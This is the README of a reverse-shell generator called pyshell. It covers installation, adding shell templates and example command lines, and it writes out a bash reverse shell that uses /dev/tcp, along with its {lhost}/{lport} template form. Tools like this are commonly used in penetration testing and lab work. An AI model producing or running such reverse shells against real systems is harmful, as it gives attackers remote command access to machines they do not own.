# Manuel Installation
1. git clone https://github.com/whitecat1331/pyshell.git
2. cd pyshell
3. python -m venv env
4. source env/bin/activate
5. pip install -r requriements.txt
6. python pyshell.py --help
# Quick Installation
1. git clone https://github.com/whitecat1331/pyshell.git
2. cd pyshell
3. python -m venv env
4. source env/bin/activate
5. pip install .
6. pyshell --help
# Features
## Add new template shell or language
1. create your new reverse shell in the shells directory.
2. replace the ip in the scripts directory with {lhost} and then replace the port with {lport}
3. For example replace, bash -i >& /dev/tcp/127.0.0.1/8080 0>&1 with bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
4. The new script will be displayed in the languages field from the help menu.
# Examples:
- python pyshell.py --help
- python pyshell.py -l bash -i 10.10.10.10 8081
- python pyshell.py -l python -I eth0 7111
![pyshell examples](./pyshell.png)
